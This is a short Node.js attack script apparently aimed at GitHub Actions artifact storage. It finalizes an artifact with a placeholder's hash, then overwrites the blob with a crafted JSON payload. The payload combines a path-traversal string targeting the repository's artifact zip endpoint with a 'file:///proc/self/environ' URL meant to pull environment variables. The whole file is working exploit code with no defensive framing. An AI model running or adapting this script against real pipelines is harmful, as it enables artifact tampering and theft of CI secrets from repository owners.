import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids=getBackendIdsFromToken();
const client=internalArtifactTwirpClient({maxAttempts:1});
const repo=process.env.GITHUB_REPOSITORY, runId=process.env.GITHUB_RUN_ID;
const sha=b=>createHash('sha256').update(b).digest('hex');
const name=`xc-${runId}`;
const placeholder=Buffer.from('{}');
const created=await client.CreateArtifact({...ids,name,version:7,mimeType:StringValue.create({value:'text/plain'})});
if(!created.ok){console.log('XC create fail');process.exit(1);}
const block=new BlobClient(created.signedUploadUrl).getBlockBlobClient();
await block.uploadData(placeholder,{blobHTTPHeaders:{blobContentType:'text/plain'}});
const fin=await client.FinalizeArtifact({...ids,name,size:String(placeholder.length),hash:StringValue.create({value:`sha256:${sha(placeholder)}`})});
const id=String(fin.artifactId);
const T=`x/../../repos/${repo}/actions/artifacts/${id}/zip`;
const P=Buffer.from(JSON.stringify({full_name:T,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'xaccel carrier',stargazers_count:0}));
await block.uploadData(P,{blobHTTPHeaders:{blobContentType:'text/plain'}});
console.log('XCARRIER',JSON.stringify({id,T,size:P.length,sha256:sha(P),p_b64:P.toString('base64')}));
